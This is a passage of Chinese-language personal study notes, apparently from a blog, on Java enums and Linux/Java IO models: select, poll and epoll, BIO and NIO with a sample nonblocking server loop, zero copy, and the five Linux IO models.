<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pizza.<span class="type">PizzaStatus</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">System.out.println(pizza.equals(Pizza.PizzaStatus.DELIVERED));<span class="comment">//空指针异常</span></span><br><span class="line">System.out.println(pizza == Pizza.PizzaStatus.DELIVERED);<span class="comment">//正常运行</span></span><br></pre></td></tr></table></figure>

<p>对于编译时安全性，两个不同枚举类型进行比较：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED.equals(TestColor.GREEN)); <span class="comment">// 编译正常</span></span><br><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED == TestColor.GREEN);      <span class="comment">// 编译失败，类型不匹配</span></span><br></pre></td></tr></table></figure>

<h3 id="在Switch语句中使用枚举类型"><a href="#在Switch语句中使用枚举类型" class="headerlink" title="在Switch语句中使用枚举类型"></a>在Switch语句中使用枚举类型</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDeliveryTimeInDays</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">        <span class="keyword">case</span> ORDERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> READY:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> DELIVERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>…</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PinType</span> &#123;</span><br><span class="line"></span><br><span class="line">    REGISTER(<span class="number">100000</span>， <span class="string">&quot;注册使用&quot;</span>)，</span><br><span class="line">    FORGET_PASSWORD(<span class="number">100001</span>， <span class="string">&quot;忘记密码使用&quot;</span>)，</span><br><span class="line">    UPDATE_PHONE_NUMBER(<span class="number">100002</span>， <span class="string">&quot;更新手机号码使用&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line"></span><br><span class="line">    PinType(<span class="type">int</span> code， String message) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;PinType&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;code=&quot;</span> + code +</span><br><span class="line">                <span class="string">&quot;， message=&#x27;&quot;</span> + message + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">实际使用：</span><br><span class="line"></span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getCode());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getMessage());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">100001</span></span><br><span class="line">忘记密码使用</span><br><span class="line">PinType&#123;code=<span class="number">100001</span>， message=<span class="string">&#x27;忘记密码使用&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><p>java buffer一般比普通io流快，因为普通io10b也调用系统调用写回，而buffer集齐8KB才调用一次系统调用</p>
<p>有些对象自己能控制就可以分配堆内内存（jvm堆里的字节数组），有些时候只能使用堆内内存（jvm堆外，java进程的堆内）（你不能控制）；都要走系统调用</p>
<p>mmap可以省一次系统调用</p>
<p>为什么设计pagecache？</p>
<p>提速，减少硬件io调用，优先使用内存；</p>
<p>如果只是new 一个socket为5，不执行accept也能建立连接，只是没有分配文件描述符去接受，只是建立连接的状态，还能相互发送数据包，但是没有分配进程去处理，文件描述符没有分配给对应的进程；  如果这个时候执行accpet把这个连接分配给对应的进程，之前发的东西也能接受到。</p>
<p>面向连接，三次握手后内核开辟资源，这个资源代表了双方建立了连接</p>
<p>socket是四元组，只要能唯一标识即可</p>
<p>不同进程之间的fd可以相同， 进程里的fd不能相同，进程间是隔离的；</p>
<p>一个进程可以监听多个端口号，new 一个socket监听一个端口号</p>
<p>Back_log &#x3D; 2， 表示最多只有2个没有进程认领的socket连接，如果超过了就会显示syn—recv状态，服务不回复syn包，或者发的包丢失都会是这个状态，没有收到客户端的ack都会是这个状态。</p>
<p>&amp;9 是指9这个文件描述符</p>
<p>不加的话就是9这个文件</p>
<p>windows可以支持aio，linux出于安全考虑没有做这个，内核更精简</p>
<p>线程池可以省下clone的时间，先clone好直接用 </p>
<p>root用户不受连接数限制，普通用户受连接数限制；</p>
<p><a href="https://www.cnblogs.com/javaguide/p/io.html">https://www.cnblogs.com/javaguide/p/io.html</a></p>
<p><a href="https://blog.csdn.net/weixin_36364419/article/details/114238400">https://blog.csdn.net/weixin_36364419/article/details/114238400</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1488087">https://cloud.tencent.com/developer/article/1488087</a></p>
<p><a href="https://www.cnblogs.com/crazymakercircle/p/10225159.html">https://www.cnblogs.com/crazymakercircle/p/10225159.html</a></p>
<p><a href="https://llc687.top/post/%E5%A6%82%E4%BD%95%E5%AE%8C%E6%88%90%E4%B8%80%E6%AC%A1-io/#gsc.tab=0">如何完成一次IO</a></p>
<h2 id="Direct-IO"><a href="#Direct-IO" class="headerlink" title="Direct IO"></a>Direct IO</h2><p>数据库一般使用directIO，就是自己管理pagecache，和linux操作系统管理的区别是它可以自己控制一些参数，而不用修改linux内核pagecache的全局参数</p>
<h2 id="Select-Poll-Epoll"><a href="#Select-Poll-Epoll" class="headerlink" title="Select Poll Epoll"></a>Select Poll Epoll</h2><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ol>
<li><p>fd_set 使用数组实现，fd_size 有限制 1024 bitmap ， fd【i】 &#x3D; accept()</p>
</li>
<li><p>fd_set不可重用，新的fd进来，重新创建</p>
</li>
<li><p>用户态和内核态拷贝fd集合产生开销</p>
</li>
<li><p>O(n)时间复杂度的轮询<br>​</p>
</li>
</ol>
<p>成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0， 具有超时时间</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848052.png" alt="img"></p>
<p>首先，fd_set结构体仅包含一个整型数组，该数组的每一位（bit）标记一个文件描述符。fd_set能容纳的文件描述符数量由FD_SETSIZE指定，这也就限制了select能同时处理的文件描述符的总量。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848060.png" alt="img"></p>
<p>FD_ZERO : 清除fdset的所有位， FD_CLR 清除位fd， FD_SET 设置fdset的位fd， FD_ISSET 测试fdset的位fd是否被设置过</p>
<h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><ol>
<li><p>用户态和内核态拷贝fd集合产生开销</p>
</li>
<li><p>O(n)时间复杂度的轮询</p>
</li>
</ol>
<p>​    基于结构体存储fd<br>​    struct pollfd{<br>​        int fd;<br>​        short events;<br>​        short revents; &#x2F;&#x2F;可重用<br>​    }<br>​    解决了select的1，2两点缺点</p>
<p>int poll(struct pollfd *ufds， unsigned int nfds， int timeout)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poll([&#123;fd=5， events=POLLIN|POLLERR&#125;]， 1， -1) = 1 ([&#123;fd=5， revents=POLLIN&#125;])</span><br></pre></td></tr></table></figure>



<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><ol>
<li>用户空间可以调用epoll create返回一个epfd即epoll文件描述符即共享空间的地址给到用户空间，</li>
<li>有一个fd过来了之后， 用户控件就把这个fd传给epoll文件描述符， 然后epoll会准备一个红黑树(增删改由内核完成)，和链表。epoll会把这个fd注册给红黑树.</li>
<li>然后用户空间会调一个系统调用调到epoll上， 此时调用的是wait，它会阻塞，直到链表中有数据，才会返回。由阻塞变为不阻塞。</li>
<li>然后用户空间再去读链表，把到达的几个文件描述符取出来，然后根据文件描述符的类型做不同的处理。</li>
</ol>
<p>解决select的1，2，3，4; 不需要轮询，时间复杂度为O(1)</p>
<p>epoll_create ：创建一个白板，存放fd_events</p>
<p>epoll_ctl ：用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上</p>
<p>epoll_wait ：通过回调函数内核会将 I&#x2F;O 准备好的描述符加入到一个链表中管理，进程调用epoll_wait() 便可以得到事件完成的描述符</p>
<p>两种触发模式：</p>
<ul>
<li><p>LT:水平触发<br>​当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。</p>
</li>
<li><p>ET:边缘触发</p>
<p>和 LT 模式不同的是，通知之后进程必须立即处理事件。下次再调用 epoll_wait() 时不会再得到事件到达的通知。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读&#x2F;阻塞写操作把处理多个文件描述符的任务饿死。</p>
</li>
</ul>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="1-select-应用场景"><a href="#1-select-应用场景" class="headerlink" title="1. select 应用场景"></a>1. select 应用场景</h4><p>select 的 timeout 参数精度为微秒，而 poll 和 epoll 为毫秒，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。</p>
<p>select 可移植性更好，几乎被所有主流平台所支持。</p>
<h4 id="2-poll-应用场景"><a href="#2-poll-应用场景" class="headerlink" title="2. poll 应用场景"></a>2. poll 应用场景</h4><p>poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。</p>
<h4 id="3-epoll-应用场景"><a href="#3-epoll-应用场景" class="headerlink" title="3. epoll 应用场景"></a>3. epoll 应用场景</h4><p>只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。</p>
<p>需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。</p>
<p>需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。</p>
<h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p>每个线程对应每个连接， 用一个主线程接受连接，连接上了之后分配一个线程去处理请求;</p>
<p>a.accept()</p>
<p>jdk 1.4 直接调用accept()阻塞等待;  jdk 8之后先调用多路复用器 poll()，这个poll()也会阻塞，然后有连接进来再调用accept()来处理;</p>
<p>缺点: 线程太多; 调度开销， 资源消耗， 根本就是因为是阻塞的;</p>
<p>socket()返回fd， 然后bind(fd，9090)，然后listen(fd)，然后accept()</p>
<h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p>OS维度是NONEBLOCKING IO 非阻塞的具体实现; java维度是New IO; 有没有NIO是操作系统内核决定的，而不是jar包; linux内核老版只支持BIO; 内核没有select就不会有java NIO; </p>
<p>ss.configureBlocking(false); 设置OS 非阻塞</p>
<p>优点:可以一个线程处理N个连接以及读写</p>
<p>弊端: 不限的系统调用，上下文切换资源消耗很多，很浪费cpu资源; 假设一个线程处理一万个请求(C10K问题)， 那么一次while循环一次会有一万次read调用; 假设前9999个read调用都返回-1，最后一个read返回了数据，那么前9999个read()调用就不该调，O(n)的复杂度;</p>
<p>NIO 属于同步非阻塞，收到的请求会先注册到多路复用器 Selector 上，多路复用器轮询直到连接有 I&#x2F;O 请求时才启动一个线程进行处理。也就是前文中的<strong>多路复用 I&#x2F;O 模型</strong>，虽然说多路复用模型是阻塞的，但在 NIO 这里，因为有<strong>Selector</strong>，read 和 write 操作都是非阻塞的，其中 Selector 其实就是 select&#x2F;poll&#x2F;epoll 的外包类。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848068.png" alt="image-20200610173230680"></p>
<p>不仅如此，NIO 除了面向流和非阻塞外，还有一个效率高的原因就是前文中也有提到的零拷贝。</p>
<p>NIO 中的 Channel（通道）相当于操作系统中的内核缓冲区， Buffer 就相当于操作系统中的用户空间缓冲区。零拷贝在 NIO 这里重要的是两个实现：</p>
<ul>
<li>FileChannel.map() : 基于内存映射 <strong>mmap</strong> 方式一种实现，可以把一个文件从 position 位置开始的 size 大小的区域映射为内存映像文件。</li>
<li>FileChannel.transferTo() : 通过调用 <strong>sendfile</strong> 方式实现的零拷贝。</li>
</ul>
<p>关于 NIO 还有一个常见的实现。那就是 Netty ， Netty 是一个高性能、异步事件驱动的 NIO 框架，但为啥不直接用 JDK 中的 NIO ，而要再造轮子呢，那当然是 Netty 比 JDK NIO 做的更多，比如解决了粘包半包、断连和 idle 处理、支持流量整形等。</p>
<p>另外说起 NIO 的零拷贝，消息队列现在基本是标配，常用有 Kafka、RocketMQ、RabbitMQ，排名按性能分先后。其中 Kafka 和 RocketMQ 分别是基于 <strong>sendfile</strong> 和 <strong>mmap + write</strong>实现的零拷贝，这也是吞吐量较大的原因之一。Nignx 通过sendfile on 配置可以开启sendfile系统调用。</p>
<p>函数定义：ssize_t read(int fd， void * buf， size_t count);</p>
<p>函数说明：read()会把参数fd所指的文件传送count 个字节到buf 指针所指的内存中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList&lt;SocketChannel&gt; clients = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">ServerSocketChannel</span> <span class="variable">ss</span> <span class="operator">=</span> ServerSocketChannel.open(); <span class="comment">// 服务端开启监听: 接受客户端</span></span><br><span class="line">ss.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9090</span>));</span><br><span class="line">ss.configureBlocking(<span class="literal">false</span>); <span class="comment">//OS  NONBLOCKING 只让接受客户端 不阻塞</span></span><br><span class="line"><span class="comment">// 在一次循环中尝试接受一个连接，接收到就入队列</span></span><br><span class="line"><span class="comment">// 一个线程</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) </span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> ss.accept(); <span class="comment">// 不会阻塞，立刻返回</span></span><br><span class="line"> 	<span class="comment">// accept 调用内核 : 1. 没有客户端连接进来，返回值? 在BIO的时候一直卡住，但是在NIO，不卡住，返回-1</span></span><br><span class="line">    <span class="comment">// 如果来客户端的连接， accept返回的是这个客户端的fd 5， client object</span></span><br><span class="line">    <span class="comment">// NONBLOCKING 就是代码不能卡住，只不过有不同的情况</span></span><br><span class="line">   	<span class="keyword">if</span> (client == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// System.out.println(&quot;null..&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        client.configureBlocking(<span class="literal">false</span>); <span class="comment">// 保证客户端不阻塞</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> client.socket().getPort();</span><br><span class="line">        System.out.println(<span class="string">&quot;client..port&quot;</span> + port);</span><br><span class="line">        clients.add(client);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">4096</span>);<span class="comment">// 可以在堆里，堆外</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历已经连接进来的客户端能不能读写数据</span></span><br><span class="line">	<span class="keyword">for</span> (SocketChannel c : clients) &#123; <span class="comment">//串行化，多线程， 可以把他们抛给多个线程或者线程池去处理</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> c.read(buffer); <span class="comment">//&gt;0 -1 0 不会阻塞</span></span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            buffer.flip();</span><br><span class="line">            <span class="type">byte</span>[] aa = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">            buffer.get(aa);</span><br><span class="line">            <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(aa);</span><br><span class="line">            System.out.println(ss.socket().getPort() + <span class="string">&quot; : &quot;</span> + b);</span><br><span class="line">            buffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java NIO 由以下几个核心部分组成：</p>
<ul>
<li>Channels</li>
<li>Buffers</li>
<li>Selectors</li>
</ul>
<p>虽然Java NIO 中除此之外还有很多类和组件，Channel，Buffer 和 Selector 构成了核心的API。其它组件，如Pipe和FileLock，只不过是与三个核心组件共同使用的工具类。</p>
<h3 id="Channel-和-Buffer"><a href="#Channel-和-Buffer" class="headerlink" title="Channel 和 Buffer"></a>Channel 和 Buffer</h3><p>基本上，所有的 IO 在NIO 中都从一个Channel 开始。Channel 有点像流。 数据可以从Channel读到Buffer中，也可以从Buffer 写到Channel中。这里有个图示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848074.png" alt="img"></p>
<p>Channel和Buffer有好几种类型。下面是JAVA NIO中的一些主要Channel的实现：</p>
<ul>
<li>FileChannel</li>
<li>DatagramChannel</li>
<li>SocketChannel</li>
<li>ServerSocketChannel</li>
</ul>
<p>正如你所看到的，这些通道涵盖了UDP 和 TCP 网络IO，以及文件IO。</p>
<p>以下是Java NIO里关键的Buffer实现：</p>
<ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>这些Buffer覆盖了你能通过IO发送的基本数据类型：byte， short， int， long， float， double 和 char。</p>
<p>Java NIO 还有个 MappedByteBuffer，用于表示内存映射文件，底层调用mmap系统调用</p>
<h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><p>Selector允许单线程处理多个 Channel。如果你的应用打开了多个连接（通道），但每个连接的流量都很低，使用Selector就会很方便。例如，在一个聊天服务器中。</p>
<p>这是在一个单线程中使用一个Selector处理3个Channel的图示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848080.png" alt="img"></p>
<p>要使用Selector，得向Selector注册Channel，然后调用它的select()方法。这个方法会一直阻塞到某个注册的通道有事件就绪。一旦这个方法返回，线程就可以处理这些事件，事件的例子有如新连接进来，数据接收等</p>
<p>recv() 和 send()：面向已连接的TCP&#x2F;IP类型socket接收或发送数据。</p>
<p>recvfrom() 和 sendto()：面向无连接的UDP数据报。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>调用select或poll，select或poll逐个去看那个数据准备好了，然后返回状态集，状态集里面有准好了的文件描述符，接着就可以调用read或recv或write读写数据;内核遍历那个好了比自己去看少了很多次系统调用，能省很多时间</p>
<p>阻塞单线程</p>
<p>收费站模型，  你开了一个收费站 ，fd为5，你在办公室办公，离收费站很远，你只有一个人， 然后你调用ss.accept()，早期linux内核直接调accept()，然后你就去收费站等着直到有路需要修，你把路修好，并把路标记为6，然后你再回去办公室，接着你读到int len &#x3D; accept.getInputStream().read(buffer);(6.read())， 然后你直接去6号路看看货物有没有准备好，没准备好你就一直等，等到了然后你再把货物搬到你的办公室，然后再处理;</p>
<p>阻塞多线程</p>
<p>收费站模型，  你开了一个收费站 ，fd为5，你在办公司办公，离收费站很远，你可以请人工作， 然后你调用ss.accept()，早期linux内核直接调accept()，然后你就去收费站等着直到有路需要修，fd6你把路修好，然后请一个工人（线程）看着这6号路，接着这个人读到int len &#x3D; accept.getInputStream().read(buffer);(6.read())， 然后他直接去6号路看看货物有没有准备好，没准备好他就一直等，等到了然后他再把货物搬到你的办公室，然后再处理; 期间你可以去干别的事;</p>
<p>非阻塞</p>
<p>收费站模型， 你在办公室办公，离收费站比较远， 调用一次SocketChannel client &#x3D; ss.accept();(底层是accept)你就去收费站看一下有没有路要加进来，有的话你把路加进来， 然后你又跑回办公室做干别的事情，没有的话你直接回去干别的事情， 然后执行到int num &#x3D; c.read(byteBuffer);  你去收费站看对应的路是否有货来了，有的话你处理一下， 你得把货物搬到自己的办公室， 然后你再对货物进行处理， 处理完了再执行到int num &#x3D; c.read(byteBuffer)，你又重复刚刚的办法; 直到把所有已注册的路处理完，然后又执行SocketChannel client &#x3D; ss.accept();  其实多跑了很多躺路; 明明可以一次性看那条路好了，然后去处理那一条路就可以，不用每一条路都去看一下;</p>
<p>阻塞多路复用器poll单线程（让linux帮你看，但是会有C10K问题，linux很傻记不住，每次重新遍历，而不是自己看）</p>
<p>收费站模型，  你开了一个收费站 ，fd为5，你在办公室办公，离收费站很远，你只有一个人， 然后你调用ss.accept()，linux内核直接调poll()，这个poll相当于一个人(他就住在收费站)， 你跑到收费站，把收费站号告诉他，然后他就去各个收费站看有没有需要修的路(但是这个人没有记忆，每次都会全看一遍，不会记录状态，很傻)，没有或者有都告诉你(期间你得在收费站等着)，你接着就调用accept来修路，修好路并且给个路号6;，然后你回去，读到6.read()，你就去6号路等着，直到有货物然后搬回来;</p>
<p>非阻塞多路复用单线程epoll</p>
<p>让那个住在收费站的人(内核)留个小本本，将所有注册的fd组织成红黑树， 然后来个链表记录</p>
<h2 id="Read和Write系统调用"><a href="#Read和Write系统调用" class="headerlink" title="Read和Write系统调用"></a>Read和Write系统调用</h2><p>read系统调用: 将数据从内核缓冲区复制到用户缓冲区</p>
<p>write系统调用: 将数据从用户缓冲区复制到内核缓冲区</p>
<p>这个两个系统调用，都不负责数据在内核缓冲区和磁盘之间的交换。底层的读写交换，是由操作系统kernel内核完成的。</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848274.png" alt="img"></p>
<p>一个典型Java 服务端处理网络请求的典型过程：</p>
<p>（1）客户端请求</p>
<p>Linux通过网卡，读取客户断的请求数据，将数据读取到内核缓冲区。</p>
<p>（2）获取请求数据</p>
<p>服务器从内核缓冲区读取数据到Java进程缓冲区。</p>
<p>（3）服务器端业务处理</p>
<p>Java服务端在自己的用户空间中，处理客户端的请求。</p>
<p>（4）服务器端返回数据</p>
<p>Java服务端已构建好的响应，从用户缓冲区写入系统缓冲区。</p>
<p>（5）发送给客户端</p>
<p>Linux内核通过网络 I&#x2F;O ，将内核缓冲区中的数据，写入网卡，网卡通过底层的通讯协议，会将数据发送给目标客户端。</p>
<h2 id="Linux五种IO模型"><a href="#Linux五种IO模型" class="headerlink" title="Linux五种IO模型"></a>Linux五种IO模型</h2><p>前4种都是同步的</p>
<p>阻塞式I&#x2F;O<br>非阻塞式I&#x2F;O<br>I&#x2F;O复用（select，poll，epoll等）<br>信号驱动式I&#x2F;O（SIGIO）<br>异步I&#x2F;O（POSIX的aio_系列函数）</p>
<h3 id="信号驱动式IO"><a href="#信号驱动式IO" class="headerlink" title="信号驱动式IO"></a>信号驱动式IO</h3><p>允许Socket进行信号驱动IO，并注册一个信号处理函数，进程继续运行并不阻塞。当数据准备好时，进程会收到一个SIGIO信号，可以在信号处理函数中调用I&#x2F;O操作函数处理数据。如下图：<br><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848311.png" alt="这里写图片描述"></p>
<h3 id="同步阻塞IO-Blocking-IO"><a href="#同步阻塞IO-Blocking-IO" class="headerlink" title="同步阻塞IO(Blocking IO)"></a>同步阻塞IO(Blocking IO)</h3><p>同步阻塞 IO 模型是最常用的一个模型，也是最简单的模型。在linux中，默认情况下所有的socket都是blocking。它符合人们最常见的思考逻辑。阻塞就是进程 “被” 休息， CPU处理其它进程去了。</p>
<h3 id="同步非阻塞-None-Blocking-IO"><a href="#同步非阻塞-None-Blocking-IO" class="headerlink" title="同步非阻塞(None Blocking IO)"></a>同步非阻塞(None Blocking IO)</h3><p>NIO模型在高并发场景下，也是不可用的。一般 Web 服务器不使用这种 IO 模型。一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性。java的实际开发中，也不会涉及这种IO模型。</p>
<h3 id="IO多路复用模型-I-x2F-O-multiplexing）"><a href="#IO多路复用模型-I-x2F-O-multiplexing）" class="headerlink" title="IO多路复用模型(I&#x2F;O multiplexing）"></a>IO多路复用模型(I&#x2F;O multiplexing）</h3><p>IO多路复用模型，就是通过一种新的系统调用，一个进程可以监视多个文件描述符，一旦某个描述符就绪（一般是内核缓冲区可读&#x2F;可写），内核kernel能够通知程序进行相应的IO系统调用。</p>
<p>目前支持IO多路复用的系统调用，有 select，poll，epoll等等。select系统调用，是目前几乎在所有的操作系统上都有支持，具有良好跨平台特性。epoll是在linux 2.6内核中提出的，是select，poll系统调用的linux增强版本。</p>
<p>IO多路复用模型的基本原理就是select&#x2F;poll&#x2F;epoll系统调用，单个线程不断的轮询select&#x2F;poll&#x2F;epoll系统调用所负责的成百上千的socket连接，当某个或者某些socket网络连接有数据到达了，就返回这些可以读写的连接。因此，好处也就显而易见了——通过一次select&#x2F;poll&#x2F;epoll系统调用，就查询到到可以读写的一个甚至是成百上千的网络连接。</p>
<p>举个栗子。发起一个多路复用IO的的read读操作系统调用，流程是这个样子：</p>
<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848325.jpeg" alt="在这里插入图片描述"></p>
<p>在这种模式中，首先不是进行read系统调动，而是进行select&#x2F;poll&#x2F;epoll系统调用。当然，这里有一个前提，需要将目标网络连接，提前注册到select&#x2F;poll&#x2F;epoll的可查询socket列表中。然后，才可以开启整个的IO多路复用模型的读流程。</p>
<p>（1）进行select&#x2F;epoll系统调用，查询可以读的连接。kernel会查询所有select的可查询socket列表，当任何一个socket中的数据准备好了，select就会返回。</p>
<p>当用户进程调用了select，那么整个线程会被block（阻塞掉）。</p>
<p>（2）用户线程获得了目标连接后，发起read系统调用，用户线程阻塞。内核开始复制数据。它就会将数据从kernel内核缓冲区，拷贝到用户缓冲区（用户内存），然后kernel返回结果。</p>
<p>（3）用户线程才解除block的状态，用户线程终于真正读取到数据，继续执行。</p>
<p>多路复用IO的特点：</p>
<p>IO多路复用模型，建立在操作系统kernel内核能够提供的多路复用系统调用select&#x2F;poll&#x2F;epoll基础之上的。多路复用IO需要用到两个系统调用（system call）， 一个select&#x2F;poll&#x2F;epoll查询调用，一个是IO的读取调用。</p>
<p>和NIO模型相似，多路复用IO需要轮询。负责select&#x2F;poll&#x2F;epoll查询调用的线程，需要不断的进行select&#x2F;epoll轮询，查找出可以进行IO操作的连接。</p>
<p>另外，多路复用IO模型与前面的NIO模型，是有关系的。对于每一个可以查询的socket，一般都设置成为non-blocking模型。只是这一点，对于用户程序是透明的（不感知）。</p>
<p>多路复用IO的优点：</p>
<p>用select&#x2F;poll&#x2F;epoll的优势在于，它可以同时处理成千上万个连接（connection）。与一条线程维护一个连接相比，I&#x2F;O多路复用技术的最大优势是：系统不必创建线程，也不必维护这些线程，从而大大减小了系统的开销。</p>
<p>Java的NIO（new IO）技术，使用的就是IO多路复用模型。在linux系统上，使用的是epoll系统调用。</p>
<p>多路复用IO的缺点：</p>
<p>本质上，select&#x2F;poll&#x2F;epoll系统调用，属于同步IO，也是阻塞IO。都需要在读写事件就绪后，自己负责进行读写，也就是说这个读写过程是阻塞的。</p>
<p>如何充分的解除线程的阻塞呢？那就是异步IO模型。</p>
<h3 id="异步IO模型（asynchronous-IO）"><a href="#异步IO模型（asynchronous-IO）" class="headerlink" title="异步IO模型（asynchronous IO）"></a>异步IO模型（asynchronous IO）</h3><p>如何进一步提升效率，解除最后一点阻塞呢？这就是异步IO模型，全称asynchronous I&#x2F;O，简称为AIO。</p>
<p>AIO的基本流程是：用户线程通过系统调用，告知kernel内核启动某个IO操作，用户线程返回。kernel内核在整个IO操作（包括数据准备、数据复制）完成后，通知用户程序，用户执行后续的业务操作。</p>
<p>kernel的数据准备是将数据从网络物理设备（网卡）读取到内核缓冲区；kernel的数据复制是将数据从内核缓冲区拷贝到用户程序空间的缓冲区。</p>
